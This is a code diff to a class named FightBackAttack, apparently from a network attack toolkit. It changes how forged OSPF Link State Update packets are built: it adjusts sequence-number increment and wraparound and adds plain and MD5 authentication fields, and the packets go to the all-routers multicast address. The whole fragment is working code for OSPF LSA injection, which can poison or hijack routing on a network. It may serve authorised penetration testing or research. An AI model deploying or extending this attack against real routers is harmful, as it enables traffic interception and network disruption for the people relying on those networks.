@@ -26,10 +26,15 @@ class FightBackAttack(BaseAttack):
             src_ip = get_local_ip(self.config.iface)
             self._src_ip = src_ip
 
+        if self._seq < 0x7FFFFFFF:
+            self._seq += 1
+        else:
+            self._seq = 0x80000001
         seq = self._seq
-        if seq < 0x7FFFFFFF:
-            seq += 1
-        self._seq = seq
+
+        if not hasattr(self, "_auth_type"):
+            self._auth_type = {"none": 0, "plain": 1, "md5": 2}.get(self.config.auth_type, 0)
+            self._auth_key = self.config.auth_key.encode() if self.config.auth_key else b""
 
         lsa = build_lsa_with_body(
             lsa_type=self.config.lsa_type,
@@ -40,6 +45,7 @@ class FightBackAttack(BaseAttack):
         pkt = build_lsu_packet(
             router_id=self.config.router_id, area_id=self.config.area_id,
             src_ip=self._src_ip, dst_ip=OSPF_MULTICAST_ALL, lsa_count=1,
+            auth_type=self._auth_type, auth_key=self._auth_key,
         )
         pkt = pkt / lsa
         return self._sender.send_raw(pkt)
